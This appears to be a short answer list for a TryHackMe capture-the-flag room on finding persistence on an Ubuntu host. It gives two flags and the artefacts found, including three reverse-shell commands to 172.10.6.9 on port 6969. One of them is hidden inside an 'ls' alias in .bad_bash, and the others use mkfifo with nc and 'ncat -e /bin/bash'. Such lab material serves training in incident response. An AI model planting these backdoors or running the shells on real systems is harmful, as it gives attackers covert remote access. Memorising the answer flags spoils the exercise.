1. Ubuntu 20.04.6 LTS
2. 1. .bad_bash
   2. ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
   3. /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
3. THM{d1rty_w0rdl1st}
4. 1. Ncat: TIMEOUT.
   2. ncat -e /bin/bash 172.10.6.9 6969
   3. .bashrc
5. nobody
6. THM{Nob0dy_1s_s@f3}
